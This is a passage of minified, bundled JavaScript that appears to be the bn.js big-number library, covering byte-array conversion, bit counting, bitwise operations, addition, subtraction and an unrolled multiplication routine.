              n(o <= i, "byte array longer than desired length"),
                n(i > 0, "Requested array length <= 0");
              var s = (function (t, e) {
                return t.allocUnsafe ? t.allocUnsafe(e) : new t(e);
              })(t, i);
              return this["_toArrayLike" + ("le" === e ? "LE" : "BE")](s, o), s;
            }),
            (o.prototype._toArrayLikeLE = function (t, e) {
              for (var n = 0, r = 0, o = 0, i = 0; o < this.length; o++) {
                var s = (this.words[o] << i) | r;
                (t[n++] = 255 & s),
                  n < t.length && (t[n++] = (s >> 8) & 255),
                  n < t.length && (t[n++] = (s >> 16) & 255),
                  6 === i
                    ? (n < t.length && (t[n++] = (s >> 24) & 255),
                      (r = 0),
                      (i = 0))
                    : ((r = s >>> 24), (i += 2));
              }
              if (n < t.length) for (t[n++] = r; n < t.length; ) t[n++] = 0;
            }),
            (o.prototype._toArrayLikeBE = function (t, e) {
              for (
                var n = t.length - 1, r = 0, o = 0, i = 0;
                o < this.length;
                o++
              ) {
                var s = (this.words[o] << i) | r;
                (t[n--] = 255 & s),
                  n >= 0 && (t[n--] = (s >> 8) & 255),
                  n >= 0 && (t[n--] = (s >> 16) & 255),
                  6 === i
                    ? (n >= 0 && (t[n--] = (s >> 24) & 255), (r = 0), (i = 0))
                    : ((r = s >>> 24), (i += 2));
              }
              if (n >= 0) for (t[n--] = r; n >= 0; ) t[n--] = 0;
            }),
            Math.clz32
              ? (o.prototype._countBits = function (t) {
                  return 32 - Math.clz32(t);
                })
              : (o.prototype._countBits = function (t) {
                  var e = t,
                    n = 0;
                  return (
                    e >= 4096 && ((n += 13), (e >>>= 13)),
                    e >= 64 && ((n += 7), (e >>>= 7)),
                    e >= 8 && ((n += 4), (e >>>= 4)),
                    e >= 2 && ((n += 2), (e >>>= 2)),
                    n + e
                  );
                }),
            (o.prototype._zeroBits = function (t) {
              if (0 === t) return 26;
              var e = t,
                n = 0;
              return (
                8191 & e || ((n += 13), (e >>>= 13)),
                127 & e || ((n += 7), (e >>>= 7)),
                15 & e || ((n += 4), (e >>>= 4)),
                3 & e || ((n += 2), (e >>>= 2)),
                1 & e || n++,
                n
              );
            }),
            (o.prototype.bitLength = function () {
              var t = this.words[this.length - 1],
                e = this._countBits(t);
              return 26 * (this.length - 1) + e;
            }),
            (o.prototype.zeroBits = function () {
              if (this.isZero()) return 0;
              for (var t = 0, e = 0; e < this.length; e++) {
                var n = this._zeroBits(this.words[e]);
                if (((t += n), 26 !== n)) break;
              }
              return t;
            }),
            (o.prototype.byteLength = function () {
              return Math.ceil(this.bitLength() / 8);
            }),
            (o.prototype.toTwos = function (t) {
              return 0 !== this.negative
                ? this.abs().inotn(t).iaddn(1)
                : this.clone();
            }),
            (o.prototype.fromTwos = function (t) {
              return this.testn(t - 1)
                ? this.notn(t).iaddn(1).ineg()
                : this.clone();
            }),
            (o.prototype.isNeg = function () {
              return 0 !== this.negative;
            }),
            (o.prototype.neg = function () {
              return this.clone().ineg();
            }),
            (o.prototype.ineg = function () {
              return this.isZero() || (this.negative ^= 1), this;
            }),
            (o.prototype.iuor = function (t) {
              for (; this.length < t.length; ) this.words[this.length++] = 0;
              for (var e = 0; e < t.length; e++)
                this.words[e] = this.words[e] | t.words[e];
              return this._strip();
            }),
            (o.prototype.ior = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuor(t);
            }),
            (o.prototype.or = function (t) {
              return this.length > t.length
                ? this.clone().ior(t)
                : t.clone().ior(this);
            }),
            (o.prototype.uor = function (t) {
              return this.length > t.length
                ? this.clone().iuor(t)
                : t.clone().iuor(this);
            }),
            (o.prototype.iuand = function (t) {
              var e;
              e = this.length > t.length ? t : this;
              for (var n = 0; n < e.length; n++)
                this.words[n] = this.words[n] & t.words[n];
              return (this.length = e.length), this._strip();
            }),
            (o.prototype.iand = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuand(t);
            }),
            (o.prototype.and = function (t) {
              return this.length > t.length
                ? this.clone().iand(t)
                : t.clone().iand(this);
            }),
            (o.prototype.uand = function (t) {
              return this.length > t.length
                ? this.clone().iuand(t)
                : t.clone().iuand(this);
            }),
            (o.prototype.iuxor = function (t) {
              var e, n;
              this.length > t.length
                ? ((e = this), (n = t))
                : ((e = t), (n = this));
              for (var r = 0; r < n.length; r++)
                this.words[r] = e.words[r] ^ n.words[r];
              if (this !== e)
                for (; r < e.length; r++) this.words[r] = e.words[r];
              return (this.length = e.length), this._strip();
            }),
            (o.prototype.ixor = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuxor(t);
            }),
            (o.prototype.xor = function (t) {
              return this.length > t.length
                ? this.clone().ixor(t)
                : t.clone().ixor(this);
            }),
            (o.prototype.uxor = function (t) {
              return this.length > t.length
                ? this.clone().iuxor(t)
                : t.clone().iuxor(this);
            }),
            (o.prototype.inotn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = 0 | Math.ceil(t / 26),
                r = t % 26;
              this._expand(e), r > 0 && e--;
              for (var o = 0; o < e; o++)
                this.words[o] = 67108863 & ~this.words[o];
              return (
                r > 0 &&
                  (this.words[o] = ~this.words[o] & (67108863 >> (26 - r))),
                this._strip()
              );
            }),
            (o.prototype.notn = function (t) {
              return this.clone().inotn(t);
            }),
            (o.prototype.setn = function (t, e) {
              n("number" == typeof t && t >= 0);
              var r = (t / 26) | 0,
                o = t % 26;
              return (
                this._expand(r + 1),
                (this.words[r] = e
                  ? this.words[r] | (1 << o)
                  : this.words[r] & ~(1 << o)),
                this._strip()
              );
            }),
            (o.prototype.iadd = function (t) {
              var e, n, r;
              if (0 !== this.negative && 0 === t.negative)
                return (
                  (this.negative = 0),
                  (e = this.isub(t)),
                  (this.negative ^= 1),
                  this._normSign()
                );
              if (0 === this.negative && 0 !== t.negative)
                return (
                  (t.negative = 0),
                  (e = this.isub(t)),
                  (t.negative = 1),
                  e._normSign()
                );
              this.length > t.length
                ? ((n = this), (r = t))
                : ((n = t), (r = this));
              for (var o = 0, i = 0; i < r.length; i++)
                (e = (0 | n.words[i]) + (0 | r.words[i]) + o),
                  (this.words[i] = 67108863 & e),
                  (o = e >>> 26);
              for (; 0 !== o && i < n.length; i++)
                (e = (0 | n.words[i]) + o),
                  (this.words[i] = 67108863 & e),
                  (o = e >>> 26);
              if (((this.length = n.length), 0 !== o))
                (this.words[this.length] = o), this.length++;
              else if (n !== this)
                for (; i < n.length; i++) this.words[i] = n.words[i];
              return this;
            }),
            (o.prototype.add = function (t) {
              var e;
              return 0 !== t.negative && 0 === this.negative
                ? ((t.negative = 0), (e = this.sub(t)), (t.negative ^= 1), e)
                : 0 === t.negative && 0 !== this.negative
                ? ((this.negative = 0),
                  (e = t.sub(this)),
                  (this.negative = 1),
                  e)
                : this.length > t.length
                ? this.clone().iadd(t)
                : t.clone().iadd(this);
            }),
            (o.prototype.isub = function (t) {
              if (0 !== t.negative) {
                t.negative = 0;
                var e = this.iadd(t);
                return (t.negative = 1), e._normSign();
              }
              if (0 !== this.negative)
                return (
                  (this.negative = 0),
                  this.iadd(t),
                  (this.negative = 1),
                  this._normSign()
                );
              var n,
                r,
                o = this.cmp(t);
              if (0 === o)
                return (
                  (this.negative = 0),
                  (this.length = 1),
                  (this.words[0] = 0),
                  this
                );
              o > 0 ? ((n = this), (r = t)) : ((n = t), (r = this));
              for (var i = 0, s = 0; s < r.length; s++)
                (i = (e = (0 | n.words[s]) - (0 | r.words[s]) + i) >> 26),
                  (this.words[s] = 67108863 & e);
              for (; 0 !== i && s < n.length; s++)
                (i = (e = (0 | n.words[s]) + i) >> 26),
                  (this.words[s] = 67108863 & e);
              if (0 === i && s < n.length && n !== this)
                for (; s < n.length; s++) this.words[s] = n.words[s];
              return (
                (this.length = Math.max(this.length, s)),
                n !== this && (this.negative = 1),
                this._strip()
              );
            }),
            (o.prototype.sub = function (t) {
              return this.clone().isub(t);
            });
          var m = function (t, e, n) {
            var r,
              o,
              i,
              s = t.words,
              a = e.words,
              u = n.words,
              c = 0,
              l = 0 | s[0],
              d = 8191 & l,
              f = l >>> 13,
              h = 0 | s[1],
              p = 8191 & h,
              m = h >>> 13,
              g = 0 | s[2],
              y = 8191 & g,
              w = g >>> 13,
              b = 0 | s[3],
              v = 8191 & b,
              A = b >>> 13,
              k = 0 | s[4],
              I = 8191 & k,
              S = k >>> 13,
              _ = 0 | s[5],
              T = 8191 & _,
              C = _ >>> 13,
              B = 0 | s[6],
              E = 8191 & B,
              x = B >>> 13,
              P = 0 | s[7],
              R = 8191 & P,
              O = P >>> 13,
              M = 0 | s[8],
              L = 8191 & M,
              N = M >>> 13,
              D = 0 | s[9],
              U = 8191 & D,
              q = D >>> 13,
              W = 0 | a[0],
              z = 8191 & W,
              K = W >>> 13,
              F = 0 | a[1],
              j = 8191 & F,
              G = F >>> 13,
              V = 0 | a[2],
              H = 8191 & V,
              X = V >>> 13,
              Z = 0 | a[3],
              J = 8191 & Z,
              Y = Z >>> 13,
              Q = 0 | a[4],
              $ = 8191 & Q,
              tt = Q >>> 13,
              et = 0 | a[5],
              nt = 8191 & et,
              rt = et >>> 13,
              ot = 0 | a[6],
              it = 8191 & ot,
              st = ot >>> 13,
              at = 0 | a[7],
              ut = 8191 & at,
              ct = at >>> 13,
              lt = 0 | a[8],
              dt = 8191 & lt,
              ft = lt >>> 13,
              ht = 0 | a[9],
              pt = 8191 & ht,
              mt = ht >>> 13;
            (n.negative = t.negative ^ e.negative), (n.length = 19);
            var gt =
              (((c + (r = Math.imul(d, z))) | 0) +
                ((8191 & (o = ((o = Math.imul(d, K)) + Math.imul(f, z)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = Math.imul(f, K)) + (o >>> 13)) | 0) + (gt >>> 26)) | 0),
              (gt &= 67108863),
              (r = Math.imul(p, z)),
              (o = ((o = Math.imul(p, K)) + Math.imul(m, z)) | 0),
              (i = Math.imul(m, K));
            var yt =
              (((c + (r = (r + Math.imul(d, j)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, G)) | 0) + Math.imul(f, j)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, G)) | 0) + (o >>> 13)) | 0) +
                (yt >>> 26)) |
              0),
              (yt &= 67108863),
              (r = Math.imul(y, z)),
              (o = ((o = Math.imul(y, K)) + Math.imul(w, z)) | 0),
              (i = Math.imul(w, K)),
              (r = (r + Math.imul(p, j)) | 0),
              (o = ((o = (o + Math.imul(p, G)) | 0) + Math.imul(m, j)) | 0),
              (i = (i + Math.imul(m, G)) | 0);
            var wt =
              (((c + (r = (r + Math.imul(d, H)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, X)) | 0) + Math.imul(f, H)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, X)) | 0) + (o >>> 13)) | 0) +
                (wt >>> 26)) |
              0),
              (wt &= 67108863),
              (r = Math.imul(v, z)),
              (o = ((o = Math.imul(v, K)) + Math.imul(A, z)) | 0),
              (i = Math.imul(A, K)),
              (r = (r + Math.imul(y, j)) | 0),
              (o = ((o = (o + Math.imul(y, G)) | 0) + Math.imul(w, j)) | 0),
              (i = (i + Math.imul(w, G)) | 0),
              (r = (r + Math.imul(p, H)) | 0),
              (o = ((o = (o + Math.imul(p, X)) | 0) + Math.imul(m, H)) | 0),
              (i = (i + Math.imul(m, X)) | 0);
            var bt =
              (((c + (r = (r + Math.imul(d, J)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, Y)) | 0) + Math.imul(f, J)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, Y)) | 0) + (o >>> 13)) | 0) +
                (bt >>> 26)) |
              0),
              (bt &= 67108863),
              (r = Math.imul(I, z)),
              (o = ((o = Math.imul(I, K)) + Math.imul(S, z)) | 0),
              (i = Math.imul(S, K)),
              (r = (r + Math.imul(v, j)) | 0),
              (o = ((o = (o + Math.imul(v, G)) | 0) + Math.imul(A, j)) | 0),
              (i = (i + Math.imul(A, G)) | 0),
              (r = (r + Math.imul(y, H)) | 0),
              (o = ((o = (o + Math.imul(y, X)) | 0) + Math.imul(w, H)) | 0),
              (i = (i + Math.imul(w, X)) | 0),
              (r = (r + Math.imul(p, J)) | 0),
              (o = ((o = (o + Math.imul(p, Y)) | 0) + Math.imul(m, J)) | 0),
              (i = (i + Math.imul(m, Y)) | 0);
            var vt =
              (((c + (r = (r + Math.imul(d, $)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, tt)) | 0) + Math.imul(f, $)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, tt)) | 0) + (o >>> 13)) | 0) +
                (vt >>> 26)) |
              0),
              (vt &= 67108863),
              (r = Math.imul(T, z)),
              (o = ((o = Math.imul(T, K)) + Math.imul(C, z)) | 0),
              (i = Math.imul(C, K)),
              (r = (r + Math.imul(I, j)) | 0),
              (o = ((o = (o + Math.imul(I, G)) | 0) + Math.imul(S, j)) | 0),
              (i = (i + Math.imul(S, G)) | 0),
              (r = (r + Math.imul(v, H)) | 0),
              (o = ((o = (o + Math.imul(v, X)) | 0) + Math.imul(A, H)) | 0),
              (i = (i + Math.imul(A, X)) | 0),
              (r = (r + Math.imul(y, J)) | 0),
              (o = ((o = (o + Math.imul(y, Y)) | 0) + Math.imul(w, J)) | 0),
              (i = (i + Math.imul(w, Y)) | 0),
              (r = (r + Math.imul(p, $)) | 0),
              (o = ((o = (o + Math.imul(p, tt)) | 0) + Math.imul(m, $)) | 0),
              (i = (i + Math.imul(m, tt)) | 0);
            var At =
              (((c + (r = (r + Math.imul(d, nt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, rt)) | 0) + Math.imul(f, nt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, rt)) | 0) + (o >>> 13)) | 0) +
                (At >>> 26)) |
              0),
              (At &= 67108863),
              (r = Math.imul(E, z)),
              (o = ((o = Math.imul(E, K)) + Math.imul(x, z)) | 0),
              (i = Math.imul(x, K)),
              (r = (r + Math.imul(T, j)) | 0),
              (o = ((o = (o + Math.imul(T, G)) | 0) + Math.imul(C, j)) | 0),
              (i = (i + Math.imul(C, G)) | 0),
              (r = (r + Math.imul(I, H)) | 0),
              (o = ((o = (o + Math.imul(I, X)) | 0) + Math.imul(S, H)) | 0),
              (i = (i + Math.imul(S, X)) | 0),
              (r = (r + Math.imul(v, J)) | 0),
              (o = ((o = (o + Math.imul(v, Y)) | 0) + Math.imul(A, J)) | 0),
              (i = (i + Math.imul(A, Y)) | 0),
              (r = (r + Math.imul(y, $)) | 0),
              (o = ((o = (o + Math.imul(y, tt)) | 0) + Math.imul(w, $)) | 0),
              (i = (i + Math.imul(w, tt)) | 0),
              (r = (r + Math.imul(p, nt)) | 0),
              (o = ((o = (o + Math.imul(p, rt)) | 0) + Math.imul(m, nt)) | 0),
              (i = (i + Math.imul(m, rt)) | 0);
            var kt =
              (((c + (r = (r + Math.imul(d, it)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, st)) | 0) + Math.imul(f, it)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, st)) | 0) + (o >>> 13)) | 0) +
                (kt >>> 26)) |
              0),
              (kt &= 67108863),
              (r = Math.imul(R, z)),
              (o = ((o = Math.imul(R, K)) + Math.imul(O, z)) | 0),
              (i = Math.imul(O, K)),
              (r = (r + Math.imul(E, j)) | 0),
              (o = ((o = (o + Math.imul(E, G)) | 0) + Math.imul(x, j)) | 0),
              (i = (i + Math.imul(x, G)) | 0),
              (r = (r + Math.imul(T, H)) | 0),
              (o = ((o = (o + Math.imul(T, X)) | 0) + Math.imul(C, H)) | 0),
              (i = (i + Math.imul(C, X)) | 0),
              (r = (r + Math.imul(I, J)) | 0),
              (o = ((o = (o + Math.imul(I, Y)) | 0) + Math.imul(S, J)) | 0),
              (i = (i + Math.imul(S, Y)) | 0),
              (r = (r + Math.imul(v, $)) | 0),
              (o = ((o = (o + Math.imul(v, tt)) | 0) + Math.imul(A, $)) | 0),
              (i = (i + Math.imul(A, tt)) | 0),
              (r = (r + Math.imul(y, nt)) | 0),
              (o = ((o = (o + Math.imul(y, rt)) | 0) + Math.imul(w, nt)) | 0),
              (i = (i + Math.imul(w, rt)) | 0),
              (r = (r + Math.imul(p, it)) | 0),
              (o = ((o = (o + Math.imul(p, st)) | 0) + Math.imul(m, it)) | 0),
              (i = (i + Math.imul(m, st)) | 0);
            var It =
              (((c + (r = (r + Math.imul(d, ut)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, ct)) | 0) + Math.imul(f, ut)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, ct)) | 0) + (o >>> 13)) | 0) +
                (It >>> 26)) |
              0),
              (It &= 67108863),
              (r = Math.imul(L, z)),
              (o = ((o = Math.imul(L, K)) + Math.imul(N, z)) | 0),
              (i = Math.imul(N, K)),
              (r = (r + Math.imul(R, j)) | 0),
              (o = ((o = (o + Math.imul(R, G)) | 0) + Math.imul(O, j)) | 0),
              (i = (i + Math.imul(O, G)) | 0),
              (r = (r + Math.imul(E, H)) | 0),
              (o = ((o = (o + Math.imul(E, X)) | 0) + Math.imul(x, H)) | 0),
              (i = (i + Math.imul(x, X)) | 0),
              (r = (r + Math.imul(T, J)) | 0),
              (o = ((o = (o + Math.imul(T, Y)) | 0) + Math.imul(C, J)) | 0),
              (i = (i + Math.imul(C, Y)) | 0),
              (r = (r + Math.imul(I, $)) | 0),
              (o = ((o = (o + Math.imul(I, tt)) | 0) + Math.imul(S, $)) | 0),
              (i = (i + Math.imul(S, tt)) | 0),
              (r = (r + Math.imul(v, nt)) | 0),
              (o = ((o = (o + Math.imul(v, rt)) | 0) + Math.imul(A, nt)) | 0),
              (i = (i + Math.imul(A, rt)) | 0),
              (r = (r + Math.imul(y, it)) | 0),
              (o = ((o = (o + Math.imul(y, st)) | 0) + Math.imul(w, it)) | 0),
              (i = (i + Math.imul(w, st)) | 0),
              (r = (r + Math.imul(p, ut)) | 0),
              (o = ((o = (o + Math.imul(p, ct)) | 0) + Math.imul(m, ut)) | 0),
              (i = (i + Math.imul(m, ct)) | 0);
            var St =
              (((c + (r = (r + Math.imul(d, dt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, ft)) | 0) + Math.imul(f, dt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, ft)) | 0) + (o >>> 13)) | 0) +
                (St >>> 26)) |
              0),
              (St &= 67108863),
              (r = Math.imul(U, z)),
              (o = ((o = Math.imul(U, K)) + Math.imul(q, z)) | 0),
              (i = Math.imul(q, K)),
              (r = (r + Math.imul(L, j)) | 0),
              (o = ((o = (o + Math.imul(L, G)) | 0) + Math.imul(N, j)) | 0),
              (i = (i + Math.imul(N, G)) | 0),
              (r = (r + Math.imul(R, H)) | 0),
              (o = ((o = (o + Math.imul(R, X)) | 0) + Math.imul(O, H)) | 0),
              (i = (i + Math.imul(O, X)) | 0),
              (r = (r + Math.imul(E, J)) | 0),
              (o = ((o = (o + Math.imul(E, Y)) | 0) + Math.imul(x, J)) | 0),
              (i = (i + Math.imul(x, Y)) | 0),
              (r = (r + Math.imul(T, $)) | 0),
              (o = ((o = (o + Math.imul(T, tt)) | 0) + Math.imul(C, $)) | 0),
              (i = (i + Math.imul(C, tt)) | 0),
              (r = (r + Math.imul(I, nt)) | 0),
              (o = ((o = (o + Math.imul(I, rt)) | 0) + Math.imul(S, nt)) | 0),
              (i = (i + Math.imul(S, rt)) | 0),
              (r = (r + Math.imul(v, it)) | 0),
              (o = ((o = (o + Math.imul(v, st)) | 0) + Math.imul(A, it)) | 0),
              (i = (i + Math.imul(A, st)) | 0),
              (r = (r + Math.imul(y, ut)) | 0),
              (o = ((o = (o + Math.imul(y, ct)) | 0) + Math.imul(w, ut)) | 0),
              (i = (i + Math.imul(w, ct)) | 0),
              (r = (r + Math.imul(p, dt)) | 0),
              (o = ((o = (o + Math.imul(p, ft)) | 0) + Math.imul(m, dt)) | 0),
              (i = (i + Math.imul(m, ft)) | 0);
            var _t =
              (((c + (r = (r + Math.imul(d, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, mt)) | 0) + Math.imul(f, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, mt)) | 0) + (o >>> 13)) | 0) +
                (_t >>> 26)) |
              0),
              (_t &= 67108863),
              (r = Math.imul(U, j)),
              (o = ((o = Math.imul(U, G)) + Math.imul(q, j)) | 0),
              (i = Math.imul(q, G)),
              (r = (r + Math.imul(L, H)) | 0),
              (o = ((o = (o + Math.imul(L, X)) | 0) + Math.imul(N, H)) | 0),
              (i = (i + Math.imul(N, X)) | 0),
              (r = (r + Math.imul(R, J)) | 0),
              (o = ((o = (o + Math.imul(R, Y)) | 0) + Math.imul(O, J)) | 0),
              (i = (i + Math.imul(O, Y)) | 0),
              (r = (r + Math.imul(E, $)) | 0),
              (o = ((o = (o + Math.imul(E, tt)) | 0) + Math.imul(x, $)) | 0),
              (i = (i + Math.imul(x, tt)) | 0),
              (r = (r + Math.imul(T, nt)) | 0),
              (o = ((o = (o + Math.imul(T, rt)) | 0) + Math.imul(C, nt)) | 0),
              (i = (i + Math.imul(C, rt)) | 0),
              (r = (r + Math.imul(I, it)) | 0),
              (o = ((o = (o + Math.imul(I, st)) | 0) + Math.imul(S, it)) | 0),
              (i = (i + Math.imul(S, st)) | 0),
              (r = (r + Math.imul(v, ut)) | 0),
              (o = ((o = (o + Math.imul(v, ct)) | 0) + Math.imul(A, ut)) | 0),
              (i = (i + Math.imul(A, ct)) | 0),
              (r = (r + Math.imul(y, dt)) | 0),
              (o = ((o = (o + Math.imul(y, ft)) | 0) + Math.imul(w, dt)) | 0),
              (i = (i + Math.imul(w, ft)) | 0);
            var Tt =
              (((c + (r = (r + Math.imul(p, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(p, mt)) | 0) + Math.imul(m, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(m, mt)) | 0) + (o >>> 13)) | 0) +
                (Tt >>> 26)) |
              0),
              (Tt &= 67108863),
              (r = Math.imul(U, H)),
              (o = ((o = Math.imul(U, X)) + Math.imul(q, H)) | 0),
              (i = Math.imul(q, X)),
              (r = (r + Math.imul(L, J)) | 0),
              (o = ((o = (o + Math.imul(L, Y)) | 0) + Math.imul(N, J)) | 0),
              (i = (i + Math.imul(N, Y)) | 0),
              (r = (r + Math.imul(R, $)) | 0),
              (o = ((o = (o + Math.imul(R, tt)) | 0) + Math.imul(O, $)) | 0),
              (i = (i + Math.imul(O, tt)) | 0),
              (r = (r + Math.imul(E, nt)) | 0),
              (o = ((o = (o + Math.imul(E, rt)) | 0) + Math.imul(x, nt)) | 0),
              (i = (i + Math.imul(x, rt)) | 0),
              (r = (r + Math.imul(T, it)) | 0),
              (o = ((o = (o + Math.imul(T, st)) | 0) + Math.imul(C, it)) | 0),
              (i = (i + Math.imul(C, st)) | 0),
              (r = (r + Math.imul(I, ut)) | 0),
              (o = ((o = (o + Math.imul(I, ct)) | 0) + Math.imul(S, ut)) | 0),
              (i = (i + Math.imul(S, ct)) | 0),
              (r = (r + Math.imul(v, dt)) | 0),
              (o = ((o = (o + Math.imul(v, ft)) | 0) + Math.imul(A, dt)) | 0),
              (i = (i + Math.imul(A, ft)) | 0);
            var Ct =
              (((c + (r = (r + Math.imul(y, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(y, mt)) | 0) + Math.imul(w, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(w, mt)) | 0) + (o >>> 13)) | 0) +
                (Ct >>> 26)) |
              0),
              (Ct &= 67108863),
              (r = Math.imul(U, J)),
              (o = ((o = Math.imul(U, Y)) + Math.imul(q, J)) | 0),
              (i = Math.imul(q, Y)),
              (r = (r + Math.imul(L, $)) | 0),
              (o = ((o = (o + Math.imul(L, tt)) | 0) + Math.imul(N, $)) | 0),
              (i = (i + Math.imul(N, tt)) | 0),
              (r = (r + Math.imul(R, nt)) | 0),
              (o = ((o = (o + Math.imul(R, rt)) | 0) + Math.imul(O, nt)) | 0),
              (i = (i + Math.imul(O, rt)) | 0),
              (r = (r + Math.imul(E, it)) | 0),
              (o = ((o = (o + Math.imul(E, st)) | 0) + Math.imul(x, it)) | 0),
              (i = (i + Math.imul(x, st)) | 0),
              (r = (r + Math.imul(T, ut)) | 0),
              (o = ((o = (o + Math.imul(T, ct)) | 0) + Math.imul(C, ut)) | 0),
              (i = (i + Math.imul(C, ct)) | 0),
              (r = (r + Math.imul(I, dt)) | 0),
              (o = ((o = (o + Math.imul(I, ft)) | 0) + Math.imul(S, dt)) | 0),
              (i = (i + Math.imul(S, ft)) | 0);
            var Bt =
              (((c + (r = (r + Math.imul(v, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(v, mt)) | 0) + Math.imul(A, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(A, mt)) | 0) + (o >>> 13)) | 0) +
                (Bt >>> 26)) |
              0),
              (Bt &= 67108863),
              (r = Math.imul(U, $)),
              (o = ((o = Math.imul(U, tt)) + Math.imul(q, $)) | 0),
              (i = Math.imul(q, tt)),
              (r = (r + Math.imul(L, nt)) | 0),
              (o = ((o = (o + Math.imul(L, rt)) | 0) + Math.imul(N, nt)) | 0),
              (i = (i + Math.imul(N, rt)) | 0),
              (r = (r + Math.imul(R, it)) | 0),
              (o = ((o = (o + Math.imul(R, st)) | 0) + Math.imul(O, it)) | 0),
              (i = (i + Math.imul(O, st)) | 0),
              (r = (r + Math.imul(E, ut)) | 0),
              (o = ((o = (o + Math.imul(E, ct)) | 0) + Math.imul(x, ut)) | 0),
              (i = (i + Math.imul(x, ct)) | 0),
              (r = (r + Math.imul(T, dt)) | 0),
              (o = ((o = (o + Math.imul(T, ft)) | 0) + Math.imul(C, dt)) | 0),
              (i = (i + Math.imul(C, ft)) | 0);
            var Et =
              (((c + (r = (r + Math.imul(I, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(I, mt)) | 0) + Math.imul(S, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(S, mt)) | 0) + (o >>> 13)) | 0) +
                (Et >>> 26)) |
              0),
              (Et &= 67108863),
              (r = Math.imul(U, nt)),
              (o = ((o = Math.imul(U, rt)) + Math.imul(q, nt)) | 0),
              (i = Math.imul(q, rt)),
              (r = (r + Math.imul(L, it)) | 0),
              (o = ((o = (o + Math.imul(L, st)) | 0) + Math.imul(N, it)) | 0),
              (i = (i + Math.imul(N, st)) | 0),
              (r = (r + Math.imul(R, ut)) | 0),
              (o = ((o = (o + Math.imul(R, ct)) | 0) + Math.imul(O, ut)) | 0),
              (i = (i + Math.imul(O, ct)) | 0),
              (r = (r + Math.imul(E, dt)) | 0),
              (o = ((o = (o + Math.imul(E, ft)) | 0) + Math.imul(x, dt)) | 0),
              (i = (i + Math.imul(x, ft)) | 0);
            var xt =
              (((c + (r = (r + Math.imul(T, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(T, mt)) | 0) + Math.imul(C, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(C, mt)) | 0) + (o >>> 13)) | 0) +
                (xt >>> 26)) |
              0),
              (xt &= 67108863),
              (r = Math.imul(U, it)),
              (o = ((o = Math.imul(U, st)) + Math.imul(q, it)) | 0),
              (i = Math.imul(q, st)),
              (r = (r + Math.imul(L, ut)) | 0),
              (o = ((o = (o + Math.imul(L, ct)) | 0) + Math.imul(N, ut)) | 0),
              (i = (i + Math.imul(N, ct)) | 0),
              (r = (r + Math.imul(R, dt)) | 0),
              (o = ((o = (o + Math.imul(R, ft)) | 0) + Math.imul(O, dt)) | 0),
              (i = (i + Math.imul(O, ft)) | 0);
            var Pt =
              (((c + (r = (r + Math.imul(E, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(E, mt)) | 0) + Math.imul(x, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(x, mt)) | 0) + (o >>> 13)) | 0) +
                (Pt >>> 26)) |
              0),
              (Pt &= 67108863),
              (r = Math.imul(U, ut)),
              (o = ((o = Math.imul(U, ct)) + Math.imul(q, ut)) | 0),
              (i = Math.imul(q, ct)),
              (r = (r + Math.imul(L, dt)) | 0),
              (o = ((o = (o + Math.imul(L, ft)) | 0) + Math.imul(N, dt)) | 0),
              (i = (i + Math.imul(N, ft)) | 0);
            var Rt =
              (((c + (r = (r + Math.imul(R, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(R, mt)) | 0) + Math.imul(O, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(O, mt)) | 0) + (o >>> 13)) | 0) +
                (Rt >>> 26)) |
              0),
              (Rt &= 67108863),
              (r = Math.imul(U, dt)),
              (o = ((o = Math.imul(U, ft)) + Math.imul(q, dt)) | 0),
              (i = Math.imul(q, ft));
            var Ot =
              (((c + (r = (r + Math.imul(L, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(L, mt)) | 0) + Math.imul(N, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
